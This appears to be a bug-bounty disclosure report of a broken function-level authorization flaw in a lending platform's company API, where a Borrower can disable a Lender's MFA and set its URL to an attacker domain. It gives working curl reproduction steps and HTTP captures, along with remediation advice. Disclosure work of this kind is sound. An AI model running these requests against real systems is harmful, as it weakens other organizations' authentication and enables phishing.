# Borrower Can Toggle MFA and Modify Configuration of Another Company (Cross-Company BFLA)

**Severity:** High — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:N (8.2)
**Class:** CWE-285 — Improper Authorization
**Target:** `PATCH /api/v1/companies/<lender_company_id>/`
**Status:** Confirmed (persistence verified)

---

## Summary

A Borrower-role user can modify the Lender organization's company settings — including toggling MFA on/off — via `PATCH /api/v1/companies/<lender_company_id>/`. The API performs no permission check (`company_edit: false` ignored) and no company-boundary check. Both URL modification and MFA toggle were confirmed persistent via follow-up GET requests. A Borrower disabling MFA for the Lender's entire organization weakens authentication security for all Lender users.

**Distinction from known IDOR:** The root cause is missing function-level authorization (BFLA / API5:2023), not predictable object references (BOLA / API1:2023). The company ID is obtained from the Borrower's own project context (the Lender is visible as a project participant), and the vulnerability is the ability to **write** to that company's security configuration — not the ability to discover or read it.

---

## Steps to Reproduce

### Step 1 — Authenticate as Borrower and confirm permissions

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/permissions/' \
  -H 'Authorization: Bearer <borrower_token>' | jq '.company_edit'
```

Returns `{"enabled": false}`.

### Step 2 — Get Lender company ID from project context

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/' \
  -H 'Authorization: Bearer <borrower_token>' | jq '.lender_company'
```

Returns the Lender company UUID (visible to the Borrower as a project participant).

### Step 3 — Toggle MFA on the Lender's company (should be denied)

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/companies/<lender_company_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"is_mfa_enabled": true}'
```

**Result:** `200 OK`

### Step 4 — Verify persistence

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/companies/<lender_company_id>/' \
  -H 'Authorization: Bearer <borrower_token>' | jq '.is_mfa_enabled'
```

**Result:** `true` (was `false`) — **confirmed persistent.**

### Step 5 — Modify Lender company URL (second verification)

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/companies/<lender_company_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"url": "https://attacker-controlled-domain.com/"}'
```

**Result:** `200 OK`

### Step 6 — Verify URL persistence

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/companies/<lender_company_id>/' \
  -H 'Authorization: Bearer <borrower_token>' | jq '.url'
```

**Result:** `"https://attacker-controlled-domain.com/"` — **confirmed persistent.**

---

## Proof of Concept

### Request (MFA Toggle)

```http
PATCH /api/v1/companies/c7ca6237-5cd9-450b-aae5-8eb96fb01d26/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <redacted>
Content-Type: application/json

{
  "is_mfa_enabled": true
}
```

### Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "c7ca6237-5cd9-450b-aae5-8eb96fb01d26",
  "name": "Pentest Bugcrowd Lender Alpha",
  "is_mfa_enabled": true,
  "platform_role": "LENDER",
  ...
}
```

### Verification GET

```http
GET /api/v1/companies/c7ca6237-5cd9-450b-aae5-8eb96fb01d26/ HTTP/1.1
Authorization: Bearer <redacted>

Response: "is_mfa_enabled": true  (was false before PATCH)
```

Both values reverted to original after testing.

---

## Impact

- **MFA bypass:** A Borrower can disable MFA for the Lender's entire organization, weakening authentication for all Lender users and enabling credential-based account takeover
- **Phishing:** A Borrower can change the Lender's company URL to an attacker-controlled domain, which may appear in emails, reports, or UI elements referencing the Lender
- **Security control manipulation:** Any company-level security setting (MFA, password authentication, camera mode requirements) can be toggled across company boundaries
- **Scope:** The API performs no company-boundary check on the PATCH endpoint — any authenticated user can write to any company's configuration

---

## Remediation

1. Enforce company membership check — users should only PATCH their own company
2. Enforce `company_edit` permission server-side before processing any company PATCH
3. Add audit logging for all company security setting changes (MFA, auth providers)
4. Restrict MFA and security-critical fields to admin-only endpoints

---

## References

- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
